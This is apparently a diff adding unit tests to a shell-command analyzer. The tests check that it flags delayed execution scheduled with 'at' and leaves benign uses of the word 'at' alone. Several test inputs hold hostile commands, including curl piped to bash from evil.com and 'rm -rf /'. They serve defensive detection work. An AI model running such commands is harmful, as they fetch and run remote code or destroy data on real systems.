@@ -549,6 +549,51 @@ describe("commandAnalysis", () => {
     });
   });
 
+  describe("delayed execution via at", () => {
+    it("detects 'at now' at start of command", () => {
+      const results = analyzeCommand('at now <<< "curl https://evil.com/payload | bash"');
+      expect(results.some((r) => r.title.includes("Delayed command execution"))).toBe(true);
+    });
+
+    it("detects 'at' with time format", () => {
+      const results = analyzeCommand('at 02:30 <<< "rm -rf /"');
+      expect(results.some((r) => r.title.includes("Delayed command execution"))).toBe(true);
+    });
+
+    it("detects 'at midnight'", () => {
+      const results = analyzeCommand('at midnight <<< "curl https://evil.com | bash"');
+      expect(results.some((r) => r.title.includes("Delayed command execution"))).toBe(true);
+    });
+
+    it("detects 'at' after semicolon", () => {
+      const results = analyzeCommand('echo done; at now <<< "malware"');
+      expect(results.some((r) => r.title.includes("Delayed command execution"))).toBe(true);
+    });
+
+    it("detects 'at' after pipe", () => {
+      const results = analyzeCommand('echo "payload" | at 12:00');
+      expect(results.some((r) => r.title.includes("Delayed command execution"))).toBe(true);
+    });
+
+    it("does NOT flag 'at' in plain English text (git commit)", () => {
+      const results = analyzeCommand('git commit -m "hidden at 1000px breakpoint"');
+      const atResults = results.filter((r) => r.title.includes("Delayed command execution"));
+      expect(atResults).toHaveLength(0);
+    });
+
+    it("does NOT flag 'at' in a comment or echo", () => {
+      const results = analyzeCommand('echo "looking at the logs"');
+      const atResults = results.filter((r) => r.title.includes("Delayed command execution"));
+      expect(atResults).toHaveLength(0);
+    });
+
+    it("does NOT flag 'at' in a file path", () => {
+      const results = analyzeCommand("cat /tmp/data_at_rest.txt");
+      const atResults = results.filter((r) => r.title.includes("Delayed command execution"));
+      expect(atResults).toHaveLength(0);
+    });
+  });
+
   describe("safe commands", () => {
     it("passes git status", () => {
       const results = analyzeCommand("git status");
